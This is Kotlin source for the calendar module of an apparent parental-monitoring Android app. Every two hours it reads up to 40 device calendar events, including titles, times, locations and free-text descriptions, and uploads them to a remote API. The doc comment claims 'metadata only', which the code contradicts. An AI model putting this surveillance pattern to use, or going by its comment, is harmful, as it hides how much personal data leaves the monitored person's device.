package com.example.kidsguardchild.modules

import android.content.Context
import android.database.Cursor
import android.provider.CalendarContract
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.CalendarEventBody
import com.example.kidsguardchild.core.DataUploader
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

private const val TAG = "CalendarModule"

/**
 * Syncs calendar events from the device calendar (metadata only).
 * Requires READ_CALENDAR permission.
 */
class CalendarModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun start() {
        job = scope.launch {
            uploadEvents()
            while (isActive) {
                delay(TimeUnit.HOURS.toMillis(2))
                uploadEvents()
            }
        }
        Log.d(TAG, "Calendar module started")
    }

    fun stop() {
        job?.cancel()
    }

    suspend fun syncOnce() {
        uploadEvents()
    }

    private suspend fun uploadEvents() {
        val projection = arrayOf(
            CalendarContract.Events.TITLE,
            CalendarContract.Events.DTSTART,
            CalendarContract.Events.DTEND,
            CalendarContract.Events.EVENT_LOCATION,
            CalendarContract.Events.DESCRIPTION
        )
        val now = System.currentTimeMillis()
        val windowStart = now - TimeUnit.DAYS.toMillis(30)
        val windowEnd = now + TimeUnit.DAYS.toMillis(90)
        val selection = "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ?"
        val selectionArgs = arrayOf(windowStart.toString(), windowEnd.toString())

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                "${CalendarContract.Events.DTSTART} ASC"
            )
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < 40) {
                    val title = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.TITLE)) ?: "Event"
                    val start = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTSTART))
                    val end = c.getLong(c.getColumnIndexOrThrow(CalendarContract.Events.DTEND))
                    val location = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION)) ?: ""
                    val notes = c.getString(c.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION)) ?: ""

                    DataUploader.upload("Calendar[$title]") {
                        ApiClient.service.postCalendarEvent(
                            CalendarEventBody(
                                event = title,
                                startTime = dateFormat.format(Date(start)),
                                endTime = if (end > 0) dateFormat.format(Date(end)) else "",
                                location = location,
                                notes = notes
                            )
                        )
                    }
                    count++
                }
            }
            Log.d(TAG, "Synced $count calendar events")
        } catch (e: SecurityException) {
            Log.w(TAG, "Calendar read denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Calendar sync error: ${e.message}")
        } finally {
            cursor?.close()
        }
    }
}
